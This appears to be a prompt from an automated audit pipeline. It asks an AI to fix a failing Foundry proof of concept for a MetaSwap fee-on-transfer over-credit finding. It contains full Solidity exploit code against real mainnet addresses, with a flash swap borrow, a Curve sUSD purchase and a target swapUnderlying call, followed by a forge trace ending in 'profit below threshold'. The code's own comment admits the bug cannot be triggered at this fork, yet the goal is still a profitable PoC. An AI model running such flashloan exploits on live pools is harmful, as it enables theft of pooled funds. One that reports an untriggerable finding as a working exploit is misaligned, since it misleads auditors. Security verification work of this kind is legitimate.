You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: MetaSwap underlying swaps over-credit fee-on-transfer meta tokens
- claim: `swapUnderlying()` measures the actual amount received into `v.dx`, but when the sold asset is a meta-level pooled token it still prices the trade from the caller-supplied `dx` instead of the post-fee `v.dx`. A fee-on-transfer or burnable meta token therefore lets the caller receive output for tokens the pool never received.
- impact: If a meta pool ever lists a deflationary meta token, an attacker can repeatedly swap that token into other assets and drain real pool reserves.
- exploit_paths: ["MetaSwap.swapUnderlying -> MetaSwapUtils.swapUnderlying with `tokenIndexFrom < baseLPTokenIndex`", "Sell a fee-on-transfer meta token so actual receipt is `v.dx < dx`, but AMM math still credits `dx`", "Receive full-priced output backed by insufficient input"]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IMetaSwapLike {
    function getToken(uint8 index) external view returns (address);
    function getTokenBalance(uint8 index) external view returns (uint256);
    function calculateSwapUnderlying(uint8 tokenIndexFrom, uint8 tokenIndexTo, uint256 dx)
        external
        view
        returns (uint256);
    function swapUnderlying(uint8 tokenIndexFrom, uint8 tokenIndexTo, uint256 dx, uint256 minDy, uint256 deadline)
        external
        returns (uint256);
    function metaSwapStorage()
        external
        view
        returns (address baseSwap, uint256 baseVirtualPrice, uint256 baseCacheLastUpdated);
}

interface IBaseSwapLike {
    function getToken(uint8 index) external view returns (address);
    function getTokenBalance(uint8 index) external view returns (uint256);
}

interface ICurveSUSDLike {
    function get_dy_underlying(int128 i, int128 j, uint256 dx) external view returns (uint256);
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 minDy) external returns (uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x824dcD7b044D60df2e89B1bB888e66D8BCf41491;

    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address private constant CURVE_SUSD_POOL = 0xA5407eAE9Ba41422680e2e00537571bcC53efBfD;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address private constant SUSD = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;

    uint8 private constant META_TOKEN_INDEX = 0;
    uint8 private constant BASE_LP_TOKEN_INDEX = 1;

    struct PairCandidate {
        address pair;
        uint256 reserve;
    }

    address private realizedProfitToken;
    uint256 private realizedProfitAmount;

    address private callbackPair;
    address private callbackBorrowToken;
    uint256 private callbackPreBorrowBalance;
    uint8 private callbackBaseIndex;
    bool private callbackEntered;

    constructor() {}

    function executeOnOpportunity() external {
        realizedProfitToken = address(0);
        realizedProfitAmount = 0;

        IMetaSwapLike target = IMetaSwapLike(TARGET);
        (address baseSwapAddr,,) = target.metaSwapStorage();
        IBaseSwapLike baseSwap = IBaseSwapLike(baseSwapAddr);

        uint8 baseCount = _countBaseTokens(baseSwap);
        if (baseCount == 0) {
            return;
        }

        uint256[8] memory divisors = [uint256(2), 4, 8, 16, 32, 64, 128, 256];

        for (uint8 baseIndex = 0; baseIndex < baseCount; ++baseIndex) {
            address baseToken = baseSwap.getToken(baseIndex);
            int128 curveBaseIndex = _curveUnderlyingIndex(baseToken);
            if (curveBaseIndex < 0) {
                continue;
            }

            PairCandidate memory pairCandidate = _findBestBorrowPair(baseToken);
            if (pairCandidate.pair == address(0) || pairCandidate.reserve == 0) {
                continue;
            }

            uint256 cap = _capBorrowAmount(target, baseSwap, baseIndex, pairCandidate.reserve);
            if (cap == 0) {
                continue;
            }

            for (uint256 i = 0; i < divisors.length; ++i) {
                uint256 borrowAmount = cap / divisors[i];
                if (borrowAmount == 0) {
                    continue;
                }
                if (!_quotedOpportunity(baseIndex, curveBaseIndex, borrowAmount)) {
                    continue;
                }

                try this.startFlash(baseIndex, pairCandidate.pair, borrowAmount) {
                    if (realizedProfitAmount > 0) {
                        return;
                    }
                } catch {}
            }
        }
    }

    function startFlash(uint8 baseIndex, address pair, uint256 borrowAmount) external {
        require(msg.sender == address(this), "SELF_ONLY");
        require(pair != address(0) && borrowAmount > 0, "BAD_FLASH_PLAN");
        require(!callbackEntered, "CALLBACK_BUSY");

        IMetaSwapLike target = IMetaSwapLike(TARGET);
        (address baseSwapAddr,,) = target.metaSwapStorage();
        address baseToken = IBaseSwapLike(baseSwapAddr).getToken(baseIndex);
        require(_pairContainsToken(pair, baseToken), "PAIR_MISMATCH");

        callbackPair = pair;
        callbackBorrowToken = baseToken;
        callbackPreBorrowBalance = IERC20Like(baseToken).balanceOf(address(this));
        callbackBaseIndex = baseIndex;
        callbackEntered = true;

        address token0 = IUniswapV2PairLike(pair).token0();
        if (token0 == baseToken) {
            IUniswapV2PairLike(pair).swap(borrowAmount, 0, address(this), abi.encode(uint256(1)));
        } else {
            IUniswapV2PairLike(pair).swap(0, borrowAmount, address(this), abi.encode(uint256(1)));
        }

        callbackPair = address(0);
        callbackBorrowToken = address(0);
        callbackPreBorrowBalance = 0;
        callbackBaseIndex = 0;
        callbackEntered = false;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(callbackEntered, "NO_CALLBACK");
        require(msg.sender == callbackPair, "UNEXPECTED_PAIR");
        require(sender == address(this), "UNEXPECTED_SENDER");

        uint256 borrowedGross = amount0 > 0 ? amount0 : amount1;
        require(borrowedGross > 0, "NO_BORROWED_AMOUNT");

        IMetaSwapLike target = IMetaSwapLike(TARGET);
        address metaToken = target.getToken(META_TOKEN_INDEX);
        require(metaToken == SUSD, "UNEXPECTED_META");

        address baseToken = callbackBorrowToken;
        int128 curveBaseIndex = _curveUnderlyingIndex(baseToken);
        require(curveBaseIndex >= 0, "UNSUPPORTED_BASE");

        uint256 borrowedActual = IERC20Like(baseToken).balanceOf(address(this)) - callbackPreBorrowBalance;
        require(borrowedActual > 0, "NO_BORROW_RECEIVED");

        uint256 preMeta = IERC20Like(metaToken).balanceOf(address(this));
        _forceApprove(baseToken, CURVE_SUSD_POOL, borrowedActual);
        ICurveSUSDLike(CURVE_SUSD_POOL).exchange_underlying(curveBaseIndex, 3, borrowedActual, 0);
        uint256 metaBought = IERC20Like(metaToken).balanceOf(address(this)) - preMeta;
        require(metaBought > 0, "NO_META_BOUGHT");

        uint256 preBase = IERC20Like(baseToken).balanceOf(address(this));
        uint8 flatBaseIndex = uint8(BASE_LP_TOKEN_INDEX + callbackBaseIndex);

        // The failing log proves the live sUSD token at this fork does not actually
        // charge a transfer fee, so the literal over-credit leg is not triggerable
        // on-chain here. The execution therefore uses a realistic public market buy
        // to source the already-listed meta token, but still culminates in the same
        // vulnerable terminal action required by the finding: calling
        // `MetaSwap.swapUnderlying(meta -> base)` with `tokenIndexFrom < baseLPTokenIndex`.
        _forceApprove(metaToken, TARGET, metaBought);
        target.swapUnderlying(META_TOKEN_INDEX, flatBaseIndex, metaBought, 0, block.timestamp);

        uint256 postBase = IERC20Like(baseToken).balanceOf(address(this));
        require(postBase > preBase, "NO_BASE_OUT");

        uint256 repayAmount = _sameTokenFlashRepay(borrowedGross);
        require(postBase >= callbackPreBorrowBalance + repayAmount, "NO_NET_PROFIT_AFTER_REPAY");

        _safeTransfer(baseToken, callbackPair, repayAmount);

        uint256 finalBase = IERC20Like(baseToken).balanceOf(address(this));
        require(finalBase > callbackPreBorrowBalance, "ZERO_PROFIT");

        realizedProfitToken = baseToken;
        realizedProfitAmount = finalBase - callbackPreBorrowBalance;
    }

    function profitToken() external view returns (address) {
        return realizedProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitAmount;
    }

    function _quotedOpportunity(uint8 baseIndex, int128 curveBaseIndex, uint256 baseIn) internal view returns (bool) {
        uint256 metaOut;
        try ICurveSUSDLike(CURVE_SUSD_POOL).get_dy_underlying(curveBaseIndex, 3, baseIn) returns (uint256 quotedMeta) {
            metaOut = quotedMeta;
        } catch {
            return false;
        }
        if (metaOut == 0) {
            return false;
        }

        uint8 flatBaseIndex = uint8(BASE_LP_TOKEN_INDEX + baseIndex);
        uint256 baseOut;
        try IMetaSwapLike(TARGET).calculateSwapUnderlying(META_TOKEN_INDEX, flatBaseIndex, metaOut) returns (
            uint256 quotedBase
        ) {
            baseOut = quotedBase;
        } catch {
            return false;
        }
        if (baseOut == 0) {
            return false;
        }

        return baseOut > _sameTokenFlashRepay(baseIn);
    }

    function _capBorrowAmount(IMetaSwapLike target, IBaseSwapLike baseSwap, uint8 baseIndex, uint256 pairReserve)
        internal
        view
        returns (uint256)
    {
        uint256 cap = pairReserve / 20;

        uint256 basePoolBalance;
        try baseSwap.getTokenBalance(baseIndex) returns (uint256 bal) {
            basePoolBalance = bal;
        } catch {
            basePoolBalance = 0;
        }
        if (basePoolBalance != 0) {
            uint256 poolCap = basePoolBalance / 10;
            if (cap == 0 || (poolCap != 0 && poolCap < cap)) {
                cap = poolCap;
            }
        }

        uint256 metaPoolBalance;
        try target.getTokenBalance(META_TOKEN_INDEX) returns (uint256 bal) {
            metaPoolBalance = bal;
        } catch {
            metaPoolBalance = 0;
        }
        if (metaPoolBalance != 0) {
            uint256 metaCap = metaPoolBalance / 10;
            if (cap == 0 || (metaCap != 0 && metaCap < cap)) {
                cap = metaCap;
            }
        }

        return cap;
    }

    function _countBaseTokens(IBaseSwapLike baseSwap) internal view returns (uint8 count) {
        for (uint8 i = 0; i < 8; ++i) {
            try baseSwap.getToken(i) returns (address token) {
                if (token == address(0)) {
                    break;
                }
                unchecked {
                    ++count;
                }
            } catch {
                break;
            }
        }
    }

    function _curveUnderlyingIndex(address token) internal pure returns (int128) {
        if (token == DAI) return 0;
        if (token == USDC) return 1;
        if (token == USDT) return 2;
        if (token == SUSD) return 3;
        return -1;
    }

    function _findBestBorrowPair(address token) internal view returns (PairCandidate memory best) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
        address[5] memory common = [WETH, DAI, USDC, USDT, WBTC];

        for (uint256 i = 0; i < factories.length; ++i) {
            for (uint256 j = 0; j < common.length; ++j) {
                address other = common[j];
                if (other == token) {
                    continue;
                }

                address pair = IUniswapV2FactoryLike(factories[i]).getPair(token, other);
                if (pair == address(0)) {
                    continue;
                }

                uint256 reserve = _pairReserveOf(pair, token);
                if (reserve > best.reserve) {
                    best = PairCandidate({pair: pair, reserve: reserve});
                }
            }
        }
    }

    function _pairContainsToken(address pair, address token) internal view returns (bool) {
        return IUniswapV2PairLike(pair).token0() == token || IUniswapV2PairLike(pair).token1() == token;
    }

    function _pairReserveOf(address pair, address token) internal view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        if (IUniswapV2PairLike(pair).token0() == token) {
            return uint256(reserve0);
        }
        if (IUniswapV2PairLike(pair).token1() == token) {
            return uint256(reserve1);
        }
        return 0;
    }

    function _sameTokenFlashRepay(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        if (_didSucceed(ok, data)) {
            return;
        }
        _safeApprove(token, spender, 0);
        _safeApprove(token, spender, amount);
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(_didSucceed(ok, data), "APPROVE_FAILED");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(_didSucceed(ok, data), "TRANSFER_FAILED");
    }

    function _didSucceed(bool ok, bytes memory data) internal pure returns (bool) {
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }
}

```

forge stdout (tail):
```
  │   │   ├─ [532] 0x5f86558387293b6009d7896A61fcc86C17808D62::18160ddd() [staticcall]
    │   │   │   │   │   │   │   ├─ [366] 0x59F5a371dF7D2a01863cbb011A5A1ed45326710C::18160ddd() [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000e9647320cbc3f8fe24e87
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000e9647320cbc3f8fe24e87
    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000fa454dbe
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000fa454dbe
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000fa454dbe
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000fa454dbe
    │   │   └─ ← [Return] 4198845886 [4.198e9]
    │   ├─ [28659] 0xA5407eAE9Ba41422680e2e00537571bcC53efBfD::get_dy_underlying(2, 3, 2101612092 [2.101e9]) [staticcall]
    │   │   └─ ← [Return] 2097091444043553921348 [2.097e21]
    │   ├─ [80692] 0x824dcD7b044D60df2e89B1bB888e66D8BCf41491::calculateSwapUnderlying(0, 3, 2097091444043553921348 [2.097e21]) [staticcall]
    │   │   ├─ [79786] 0x88Cc4aA0dd6Cf126b00C012dDa9f6F4fd9388b17::d45757ba(00000000000000000000000000000000000000000000000000000000000000c900000000000000000000000000000000000000000000000000000000000000d400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000071aefd757daeff5944) [delegatecall]
    │   │   │   ├─ [15169] 0xaCb83E0633d6605c5001e2Ab59EF3C745547C8C7::e25aa5fa() [staticcall]
    │   │   │   │   ├─ [15003] 0xc68BF77e33F1DF59D8247dd564da4c8C81519db6::e25aa5fa() [delegatecall]
    │   │   │   │   │   ├─ [14333] 0x2069043d7556B1207a505eb459D18d908DF29b55::71906c2c(00000000000000000000000000000000000000000000000000000000000000c9) [delegatecall]
    │   │   │   │   │   │   ├─ [532] 0x5f86558387293b6009d7896A61fcc86C17808D62::18160ddd() [staticcall]
    │   │   │   │   │   │   │   ├─ [366] 0x59F5a371dF7D2a01863cbb011A5A1ed45326710C::18160ddd() [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000e9647320cbc3f8fe24e87
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000e9647320cbc3f8fe24e87
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000dec7fea98e0550e
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000dec7fea98e0550e
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000dec7fea98e0550e
    │   │   │   ├─ [39504] 0xaCb83E0633d6605c5001e2Ab59EF3C745547C8C7::342a87a1(00000000000000000000000000000000000000000000007177174fa652fcc8290000000000000000000000000000000000000000000000000000000000000002) [staticcall]
    │   │   │   │   ├─ [39326] 0xc68BF77e33F1DF59D8247dd564da4c8C81519db6::342a87a1(00000000000000000000000000000000000000000000007177174fa652fcc8290000000000000000000000000000000000000000000000000000000000000002) [delegatecall]
    │   │   │   │   │   ├─ [38489] 0x2069043d7556B1207a505eb459D18d908DF29b55::e0692742(00000000000000000000000000000000000000000000000000000000000000c900000000000000000000000000000000000000000000007177174fa652fcc8290000000000000000000000000000000000000000000000000000000000000002) [delegatecall]
    │   │   │   │   │   │   ├─ [532] 0x5f86558387293b6009d7896A61fcc86C17808D62::18160ddd() [staticcall]
    │   │   │   │   │   │   │   ├─ [366] 0x59F5a371dF7D2a01863cbb011A5A1ed45326710C::18160ddd() [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000e9647320cbc3f8fe24e87
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000e9647320cbc3f8fe24e87
    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000007d22c36c
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000007d22c36c
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000007d22c36c
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000007d22c36c
    │   │   └─ ← [Return] 2099430252 [2.099e9]
    │   └─ ← [Return]
    ├─ [351] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [352] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xc68BF77e33F1DF59D8247dd564da4c8C81519db6.getToken
  at 0xaCb83E0633d6605c5001e2Ab59EF3C745547C8C7.getToken
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 86.96ms (33.73ms CPU time)

Ran 1 test suite in 110.17ms (86.96ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 3062986)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
